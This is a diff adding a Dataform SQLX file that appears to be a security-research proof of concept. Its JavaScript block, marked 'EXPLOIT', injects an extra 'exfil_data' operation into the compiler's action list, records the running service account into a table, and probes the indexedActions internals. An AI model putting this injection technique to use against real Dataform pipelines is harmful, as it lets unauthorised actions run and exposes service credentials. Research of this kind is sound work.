@@ -1,0 +1,51 @@
+config { type: "view", name: "action_inject" }
+
+js {
+  let r = { t: new Date().toISOString() };
+
+  // Record original actions
+  r.originalCount = dataform.actions?.length || 0;
+
+  // EXPLOIT: Try to inject a malicious action
+  try {
+    const maliciousAction = {
+      name: 'exfil_data',
+      type: 'operation',
+      proto: {
+        target: {
+          database: 'shir-research-3',
+          schema: 'dataform_poc',
+          name: 'exfil_data'
+        },
+        queries: [
+          'CREATE OR REPLACE TABLE `shir-research-3.dataform_poc.exfil` AS SELECT SESSION_USER() as service_account, CURRENT_TIMESTAMP() as ts'
+        ]
+      }
+    };
+
+    dataform.actions.push(maliciousAction);
+
+    r.afterPush = {
+      newCount: dataform.actions.length,
+      injected: dataform.actions.length > r.originalCount,
+      lastActionName: dataform.actions[dataform.actions.length - 1]?.name
+    };
+  } catch(e) {
+    r.pushError = e.message;
+  }
+
+  // Check indexed actions too
+  try {
+    r.indexedActions = {
+      type: typeof dataform.indexedActions,
+      isMap: dataform.indexedActions instanceof Map,
+      size: dataform.indexedActions instanceof Map ?
+        dataform.indexedActions.size :
+        Object.keys(dataform.indexedActions || {}).length
+    };
+  } catch(e) {
+    r.indexedActionsError = e.message;
+  }
+}
+
+SELECT '${JSON.stringify(r)}' as action_inject
